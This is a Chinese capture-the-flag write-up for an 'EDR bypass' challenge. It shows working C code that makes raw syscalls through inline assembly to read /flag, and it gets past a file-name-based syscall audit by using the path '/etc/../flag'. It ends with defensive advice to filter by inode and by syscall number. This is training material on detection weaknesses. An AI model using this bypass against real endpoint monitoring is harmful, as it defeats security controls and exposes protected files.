### 内网渗透与高级社工-终端EDR绕过-G4

#### 题目

目标主机的终端检测响应（EDR）代理已下沉到系统调用层：在 syscall 边界审计文件访问，对敏感文件的读取会被内核级遥测捕获并阻断，直接系统调用也不例外。运维程序提交 C 源码由主机编译执行。你需要写一段能绕过系统调用审计、读取 `/flag` 的程序。

#### 系统调用层

承接G3题目，这次下沉到了系统调用层、内核态。那么按照G3的分析，这已经是必经之路了，要么直面该检查，要么想办法再下一层。

用户态可触及的最深的就是系统调用层了，不能再往下了。咱们就必须直面检查，尝试绕过——先拿G3的payload试试。

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>

static long raw(long nr, long a, long b, long c)
{//汇编写了一个
    long r;
    __asm__ volatile("syscall"
                     : "=a"(r)
                     : "a"(nr), "D"(a), "S"(b), "d"(c)
                     : "rcx", "r11", "memory");
    return r;
}

int main(void)
{
    char buf[4096];
    long fd = raw(SYS_openat, AT_FDCWD, (long)"/flag", O_RDONLY);
    if (fd < 0) {
        raw(SYS_write, 1, (long)"open failed\n", 12);
        return 1;
    }

    long n;
    while ((n = raw(SYS_read, fd, (long)buf, sizeof buf)) > 0)
        raw(SYS_write, 1, (long)buf, n);

    return 0;
}
```

得到的回显是`EDR 告警：系统调用审计命中 /flag 访问，行为已阻断`。这并不能说明什么，系统层到底是syscall号拦截，还是文件名检查，抑或是inode检查？

最简单的可能是**文件名检查**了，它检查到请求访问`/flag`就会拦截。——我尝试直接修改上述payload的路径，改为了`/etc/../flag`。
——没想到真的就直接成功了！

完整payload：

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>

static long raw(long nr, long a, long b, long c)
{//汇编写了一个
    long r;
    __asm__ volatile("syscall"
                     : "=a"(r)
                     : "a"(nr), "D"(a), "S"(b), "d"(c)
                     : "rcx", "r11", "memory");
    return r;
}

int main(void)
{
    char buf[4096];
    long fd = raw(SYS_openat, AT_FDCWD, (long)"/etc/../flag", O_RDONLY);
    if (fd < 0) {
        raw(SYS_write, 1, (long)"open failed\n", 12);
        return 1;
    }

    long n;
    while ((n = raw(SYS_read, fd, (long)buf, sizeof buf)) > 0)
        raw(SYS_write, 1, (long)buf, n);

    return 0;
}
```

#### 总结与防御建议

总结：虽然这题下沉到了系统调用层，做到了“保护点在用户可达的下一层级”，也就是在必经之路上设防了；但是对于实际的防御逻辑，并没有很完善，只是一个简单的文件名过滤。

防御建议：首先肯定就是不要以文件名作为过滤依据，可以使用inode作为依据，对文件做出最严格的限制。另外还可以对syscall系统调用号进行检查，限制系统调用权限。


